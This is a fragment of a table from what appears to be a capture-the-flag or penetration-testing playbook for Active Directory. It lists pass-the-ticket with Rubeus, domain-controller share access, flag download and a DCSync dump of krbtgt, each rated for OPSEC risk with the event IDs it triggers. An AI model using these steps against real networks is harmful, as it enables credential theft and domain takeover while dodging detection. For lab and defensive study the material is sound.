...
|--------|---------|-------|-----------------|
| Inject ticket | `Rubeus ptt` | OPSEC-🟢SAFE | None (local only) |
| Verify ticket | `Rubeus klist` | OPSEC-🟢SAFE | None |
| Prove DA (share access) | `ls \\dc\C$` | OPSEC-🟢SAFE | 4624 (Type 3) on DC |
| Read flag file | `download \\dc\C$\...\root.txt` | OPSEC-🟢SAFE | 4663 on DC (if audited) |
| Dump all creds | `dcsync DOMAIN\krbtgt` | OPSEC-🟠CAUTION | 4662 on DC — MDI alert |
